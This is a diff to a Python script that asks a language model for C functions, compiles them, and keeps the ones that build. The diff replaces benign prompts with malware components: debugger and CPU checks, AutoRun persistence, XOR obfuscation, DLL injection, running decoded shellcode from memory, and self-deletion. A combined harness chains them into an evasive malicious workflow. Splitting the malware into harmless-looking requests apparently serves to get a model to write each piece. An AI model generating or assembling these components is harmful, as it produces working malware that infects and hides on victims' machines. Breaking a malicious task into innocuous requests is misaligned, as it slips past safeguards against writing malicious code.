@@ -68,39 +68,112 @@ def llm_call(prompt: str) -> str:
     return resp.text or ""
 
 BLOCK_PROMPTS = {
-    "cpu_vendor": r"""
-// Code in C
-// Code for Windows
-// Use the Windows API or intrinsics
-// Write a function
-// Function prototype is: int GetCPUVendor(char *out, int outLen);
-// Fill out with the CPU vendor string (like GenuineIntel or AuthenticAMD).
-// Return 0 on success, -1 on failure.
-""",
-    "list_processes": r"""
+    "Debugger_Identification": r"""
 // Code in C
 // Code for Windows
 // Use the Windows API
 // Write a function
-// Function prototype is: void ListProcesses();
-// Print the executable name of each running process.
+// Function prototype is: BOOL
+    Debugger_Identification();
+// Identifies if running under a debugger
+or not
+
 """,
-    "read_file": r"""
+    "CPU_Identification": r"""
 // Code in C
 // Code for Windows
 // Use the Windows API
 // Write a function
-// Function prototype is: int ReadFileToBuffer(const char *path, void *buffer, int maxLen);
-// Read up to maxLen bytes from path into buffer.
-// Return number of bytes read, or -1 on error.
+// Function prototype is: BOOL
+CPU_Identification();
+// Identifies if running under an Intel
+CPU or not
+
 """,
-    "base64_decode": r"""
+    "AutoRun": r"""
 // Code in C
 // Code for Windows
-// Use Windows APIs (Crypt32 or ATL is OK)
+// Use the Windows API
 // Write a function
-// Function prototype is: int Base64DecodeBuffer(const char *src, int srcLen, unsigned char *dst, int dstLen);
-// Decode base64 from src into dst. Return number of decoded bytes, or -1 on error.
+// Function prototype is: void AutoRun();
+// Add own path to the AutoRun key
+""",
+
+    "String_XOR": r"""
+// Code in C
+// Code for Windows
+// Use the Windows API
+// Write a function
+// Function prototype is: void String_XOR
+(char *string, char *key);
+// XOR string with a key
+""",
+
+    "DLL_Injection": r"""
+// Code in C
+// Code for Windows
+// Use the Windows API
+// Write a function
+// Function prototype is: void
+DLL_Injection(char *dll, char *
+process);
+// Inject DLL into the process
+""",
+
+    "Load_From_File": r"""
+// Code in C
+// Code for Windows
+// Use the Windows API
+// Write a function
+// Function prototype is: int
+Load_From_File(void *file, void *
+buffer);
+// Load file content into buffer
+// Return buffer size
+""",
+
+    "Decode_Base64": r"""
+// Code in C
+// Code for Windows
+// Use the Windows API
+// Write a function
+// Function prototype is: int
+Decode_Base64(void *encoded, int size
+, void *decoded);
+// Decode buffer content from base64 into
+another buffer
+// Return buffer size
+""",
+
+    "Run_From_Memory": r"""
+// Code in C
+// Code for Windows
+// Use the Windows API
+// Write a function
+// Function prototype is: void
+Run_From_Memory(void *shellcode, int
+size);
+// Execute shellcode from memory
+""",
+
+    "Delete_File": r"""
+// Code in C
+// Code for Windows
+// Use the Windows API
+// Write a function
+// Function prototype is: void
+Delete_File(char *filename);
+// Delete the file
+""",
+
+  "Delete_Itself": r"""
+// Code in C
+// Code for Windows
+// Use the Windows API
+// Write a function
+// Function prototype is: void
+Delete_Itself();
+// Delete the current process file
 """
 }
 
@@ -108,73 +181,247 @@ BLOCK_PROMPTS = {
 BLOCKS = list(BLOCK_PROMPTS.keys())
 
 #Tiny main() programs ONLY used to check compilation (see if it runs)
+#Tiny main() programs ONLY used to check compilation (see if it runs)
 HARNESS = {
-    "cpu_vendor": r"""
+    # Blocks for Antivirus/CPU Evasion
+    "Debugger_Identification": r"""
+#include <windows.h>
+#include <stdio.h>
+BOOL Debugger_Identification();
+int main() {
+    if (Debugger_Identification()) {
+        printf("Debugger detected.\n");
+    } else {
+        printf("No debugger detected.\n");
+    }
+    return 0;
+}
+""",
+    "CPU_Identification": r"""
+#include <windows.h>
+#include <stdio.h>
+BOOL CPU_Identification();
+int main() {
+    if (CPU_Identification()) {
+        printf("Target CPU (Intel) identified.\n");
+    } else {
+        printf("Target CPU (Intel) not identified.\n");
+    }
+    return 0;
+}
+""",
+
+    # Blocks for Persistence and Obfuscation
+    "AutoRun": r"""
+#include <windows.h>
+#include <stdio.h>
+void AutoRun();
+int main() {
+    printf("Attempting to set AutoRun key...\n");
+    AutoRun();
+    printf("AutoRun function called (check registry for results).\n");
+    return 0;
+}
+""",
+    "String_XOR": r"""
 #include <windows.h>
 #include <stdio.h>
 #include <string.h>
-int GetCPUVendor(char *out, int outLen);
+void String_XOR(char *string, char *key);
 int main() {
-    char buf[64] = {0};
-    int r = GetCPUVendor(buf, 64);
-    printf("r=%d vendor=%s\n", r, buf);
+    char data[] = "SecretData";
+    char key[] = "key";
+    printf("Original: %s\n", data);
+    String_XOR(data, key); // Encrypt
+    printf("XORed: %s\n", data);
+    String_XOR(data, key); // Decrypt (XOR twice)
+    printf("Decrypted: %s\n", data);
     return 0;
 }
 """,
-    "list_processes": r"""
+
+    # Blocks for Execution Techniques
+    "DLL_Injection": r"""
 #include <windows.h>
 #include <stdio.h>
-void ListProcesses();
+void DLL_Injection(char *dll, char *process);
 int main() {
-    ListProcesses();
+    printf("Simulating DLL injection into explorer.exe...\n");
+    // This harness uses dummy strings just to check compilation, 
+    // real execution would require existing paths and process names.
+    DLL_Injection("C:\\Path\\to\\malicious.dll", "explorer.exe");
+    printf("DLL Injection function called.\n");
     return 0;
 }
 """,
-    "read_file": r"""
+    "Load_From_File": r"""
 #include <windows.h>
 #include <stdio.h>
-int ReadFileToBuffer(const char *path, void *buffer, int maxLen);
+int Load_From_File(void *file, void *buffer);
 int main() {
-    char buf[64] = {0};
-    int n = ReadFileToBuffer("C:\\Windows\\win.ini", buf, 63);
-    printf("n=%d buf=%s\n", n, buf);
+    char buffer[128] = {0};
+    int n = Load_From_File("C:\\Windows\\win.ini", buffer);
+    printf("Loaded %d bytes from file. Data start: %s\n", n, (char*)buffer);
     return 0;
 }
 """,
-    "base64_decode": r"""
+    "Decode_Base64": r"""
 #include <windows.h>
 #include <stdio.h>
 #include <string.h>
-int Base64DecodeBuffer(const char *src, int srcLen, unsigned char *dst, int dstLen);
+int Decode_Base64(void *encoded, int size, void *decoded);
 int main() {
-    const char *b64 = "SGVsbG8="; // "Hello"
+    const char *b64 = "SGVsbG8gV29ybGQ="; // "Hello World"
     unsigned char out[64] = {0};
-    int n = Base64DecodeBuffer(b64, (int)strlen(b64), out, 64);
-    printf("n=%d out=%s\n", n, out);
+    int n = Decode_Base64((void*)b64, (int)strlen(b64), out);
+    printf("Decoded %d bytes: %s\n", n, out);
+    return 0;
+}
+""",
+    "Run_From_Memory": r"""
+#include <windows.h>
+#include <stdio.h>
+void Run_From_Memory(void *shellcode, int size);
+int main() {
+    // This is a dummy test. A real shellcode is needed for meaningful execution.
+    // We just ensure the function signature compiles.
+    char dummy_shellcode[] = {0x90, 0x90, 0xC3}; // NOP, NOP, RET
+    printf("Attempting to run dummy shellcode from memory...\n");
+    Run_From_Memory(dummy_shellcode, sizeof(dummy_shellcode));
+    printf("Run_From_Memory function called.\n");
+    return 0;
+}
+""",
+    
+    # Blocks for Evidence Removal
+    "Delete_File": r"""
+#include <windows.h>
+#include <stdio.h>
+void Delete_File(char *filename);
+int main() {
+    printf("Attempting to delete dummy file 'test_file.txt'...\n");
+    // Note: This will fail if the file doesn't exist, but it checks compilation.
+    // Create a dummy file here if you want successful runtime test:
+    // FILE* fp = fopen("test_file.txt", "w"); if(fp) fclose(fp);
+    Delete_File("test_file.txt"); 
+    printf("Delete_File function called.\n");
+    return 0;
+}
+""",
+    "Delete_Itself": r"""
+#include <windows.h>
+#include <stdio.h>
+void Delete_Itself();
+int main() {
+    printf("Attempting to delete current executable...\n");
+    Delete_Itself();
+    printf("Delete_Itself function called (may not complete execution).\n");
     return 0;
 }
 """
 }
 
 COMBINED_HARNESS = r"""
+#include <windows.h>
+#include <stdio.h>
+#include <string.h>
+
+// Function Prototypes (must match generated blocks)
+BOOL Debugger_Identification();
+BOOL CPU_Identification();
+void AutoRun();
+void String_XOR(char *string, char *key);
+void DLL_Injection(char *dll, char *process);
+int Load_From_File(void *file, void *buffer);
+int Decode_Base64(void *encoded, int size, void *decoded);
+void Run_From_Memory(void *shellcode, int size);
+void Delete_File(char *filename);
+void Delete_Itself();
+
+
 int main() {
-    char vendor[64] = {0};
-    GetCPUVendor(vendor, 64);
-    printf("CPU vendor: %s\n", vendor);
+    // --- 1. Defense Evasion Checks ---
+    
+    // Check 1: Debugger Identification (Figure 6: Start -> Debugger Identification)
+    printf("[*] Running Debugger Check...\n");
+    if (Debugger_Identification()) {
+        printf("[!] Debugger detected. Proceeding to Evasion/Exit routine.\n");
+        goto EVASION_ROUTINE;
+    }
+    printf("[+] Debugger NOT detected. Continuing.\n");
 
-    printf("Processes:\n");
-    ListProcesses();
+    // Check 2: CPU Identification (Figure 6: Debugger Identification -> CPUID Check)
+    printf("[*] Running CPU Identification Check (Intel target)...\n");
+    if (!CPU_Identification()) {
+        printf("[!] Target CPU NOT detected. Proceeding to Evasion/Exit routine.\n");
+        goto EVASION_ROUTINE;
+    }
+    printf("[+] Target CPU detected. Continuing execution.\n");
 
-    char buf[128] = {0};
-    int n = ReadFileToBuffer("C:\\\\Windows\\\\win.ini", buf, 127);
-    printf("ReadFileToBuffer n=%d text=%s\n", n, buf);
 
-    const char *b64 = "SGVsbG8=";
-    unsigned char out[64] = {0};
-    int m = Base64DecodeBuffer(b64, (int)strlen(b64), out, 64);
-    printf("Base64DecodeBuffer m=%d out=%s\n", m, out);
+    // --- 2. Core Malicious Actions ---
+    
+    // Action 1: Persistence (Figure 6: CPUID Check -> Set AutoRun)
+    printf("[*] Setting Persistence (AutoRun)...\n");
+    AutoRun();
 
+    // Setup: XOR strings and buffers (for simplicity, we use hardcoded paths/names)
+    char dll_name[] = "KERNEL32.DLL"; 
+    char dll_key[] = "abc";
+    char process_name[] = "explorer.exe";
+
+    // Action 2: String XOR (Figure 6: Set AutoRun -> XOR String)
+    printf("[*] XOR-ing DLL name string...\n");
+    String_XOR(dll_name, dll_key);
+    
+    // Action 3: DLL Injection (Figure 6: XOR String -> Inject DLL)
+    // NOTE: We XOR back here so DLL_Injection gets the plaintext name.
+    String_XOR(dll_name, dll_key); 
+    printf("[*] Injecting DLL into process: %s\n", process_name);
+    DLL_Injection(dll_name, process_name);
+    String_XOR(dll_name, dll_key); // Re-XOR for stealth
+
+    // Action 4: Load and Decode Payload
+    char file_path[] = "C:\\path\\to\\payload.b64";
+    char payload_buffer[1024] = {0};
+    unsigned char decoded_shellcode[1024] = {0};
+    int n_read, n_decoded;
+
+    // Load file (Figure 6: Load File)
+    printf("[*] Loading payload from file: %s\n", file_path);
+    n_read = Load_From_File(file_path, payload_buffer);
+    
+    // Decode Base64 (Figure 6: Decode Base64)
+    printf("[*] Decoding Base64 payload (Size: %d)...\n", n_read);
+    n_decoded = Decode_Base64(payload_buffer, n_read, decoded_shellcode);
+    
+    // Action 5: Execute Payload (Figure 6: Run Memory)
+    if (n_decoded > 0) {
+        printf("[*] Running shellcode from memory (Size: %d)...\n", n_decoded);
+        Run_From_Memory(decoded_shellcode, n_decoded);
+        printf("[+] Shellcode execution initiated.\n");
+    } else {
+        printf("[!] Payload decoding failed. Exiting.\n");
+    }
+
+    // --- 3. Normal Exit ---
+    printf("[✔] Malicious workflow complete. Exiting normally.\n");
     return 0;
+
+
+    // --- 4. Evasion and Exit Routine (Figure 6: Delete File -> Delete Itself -> Exit) ---
+    EVASION_ROUTINE:
+    
+    // Action 6: Delete associated library file
+    printf("[*] Deleting associated file: %s\n", dll_name);
+    Delete_File(dll_name);
+    
+    // Action 7: Delete own executable
+    printf("[*] Deleting self (Evidence removal)...\n");
+    Delete_Itself();
+
+    printf("[!] Evasion complete. Exiting.\n");
+    return -1;
 }
 """
 
@@ -228,6 +475,14 @@ def generate_variants():
             for attempt in range(1, MAX_TRIES + 1):
                 print(f"Attempt {attempt}/{MAX_TRIES}...")
                 raw = llm_call(prompt)          # 1) get LLM output
+                
+                # --- ADDED DEBUGGING LINE ---
+                if not raw:
+                    print("⚠️ LLM returned EMPTY content. Retrying...")
+                    time.sleep(1.0)
+                    continue
+                # --- END ADDED DEBUGGING LINE ---
+                
                 code = clean_code(raw)          # 2) strip fences / junk
                 ok, log = try_compile(block, code)  # 3) compile cleaned code
                 if ok:
@@ -237,8 +492,8 @@ def generate_variants():
                     print(f"✅ Compiled. Saved {out_file}")
                     break
                 else:
-                    print("❌ Compile failed. Log head:")
-                    print(log[:800])
+                    print("❌ Compile failed. Full log:")
+                    print(log)
                     time.sleep(1.0)
 
             else:
